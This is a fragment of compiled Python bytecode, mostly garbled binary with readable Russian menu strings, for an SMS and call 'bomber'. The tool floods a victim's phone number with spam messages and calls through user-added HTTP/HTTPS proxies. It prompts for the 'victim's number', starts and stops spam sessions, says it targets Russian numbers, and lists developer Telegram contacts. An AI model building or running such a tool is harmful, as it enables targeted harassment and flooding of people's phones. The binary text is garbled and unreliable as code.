__module__�__qualname__�strrE   rL   rU   rY   r[   rb   rc   rd   rf   rg   rh   rj   rn   rp   rr   rw   rx   rz   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r   r   r   r7   ?   sn   					r7   c                  C   s,   i } t rt�t �| d< tr(t�t�| d< | S )NZHTTPZHTTPS)�httpr<   �choice�https)r   r   r   r   r   �  s    r   c                   C   s   t �t jdkrdnd� d S )N�nt�cls�clear)�os�systemr@   r   r   r   r   r  �  s    r  c                  C   st  t �  tt� td� td�} | �� �rT| dkrXt �  tt� td� td� t�  �qp| dkr�t �  tt� td� td� t�  �qp| d	k�r�t �  tt� td
� td�} | �� �r�| dkr�t �  t�  n�| dk�rDt �  tt� td� td�}|dk�rt �  t�  n2t�d| � t �  tt� td� td� t�  nr| d	k�r�t �  tt� td� td�}|dk�r�t �  t�  n2t	�d| � t �  tt� td� td� t�  n$t �  tt� td� td� t�  �qp| dk�r6t �  tt� td� td�} | �� �r| dk�r�t �  tt� t
�r�t
D ]}td|� �� �q4td� td�}|dk�rjt�  |�� �r�|t
v �r�t
�|� t �  tt� td� td� t�  n$t �  tt� td� td� t�  ntd� td� t�  �q4| d	k�rxt �  tt� td� td� td�}|dk�r0t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  n�| dk�r�t �  tt� td � td�}|dk�r�t�  nFt|�}tt|�jdd���  t
�|� td|� d�� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  nt �  td� td� t�  d S )!Nu\   

[1] Бомберы
[2] Меню прокси
[3] Информация
[4] Контактыr)   �4u?   Основа: t.me/DishonorDev
Твинк: t.me/DishonorDevlopery   rs   u$   Приятного разьеба :)r   r�   uO   [1] http Прокси
[2] https прокси
[0] Вернуться в меню�0r   uc   Введите прокси в формате 192.168.1.1:8080
Для отмены введите 0zhttp://u-   Прокси успешно добавлен!�   zhttps://u   Я тебя не понялuA   [1] SMS Bomber
[2] Call Bomber
[3] Остановить спам u   Номер: uw   
Для остановки спама, введите номер телефона. Для отмены введите 0u=   Спам на номер успешно остановлен!u   Неверный номер!r�   u>   Не запущенно ни одной сесси спама!ur   Внимание! Данный бомбер работает только на Российские номера!
u0   Введите номер. Для отмены 0Fr�   u   Спам на номер u    начат.ui   Введите номер жертвы в любом формате. Для отмены введите 0)r  �printr   �inputr$   r   �mainr�   �appendr�   rJ   �remover/   r   r7   r�   r�   r�   )Ztask�proxyr-   Zslotr   r   r   r
  �  s   
�






















r
  �__main__)N)N)N)r0   )r  r   r   Zbs4r   r�   rO   r   r   r<   �timer   �	threadingr   r�   r�   rJ   �dictr   r   r    r#   r/   r�   r6   r7   r   r  r
  r�   r   r   r   r   �<module>   s2   	


	  N	 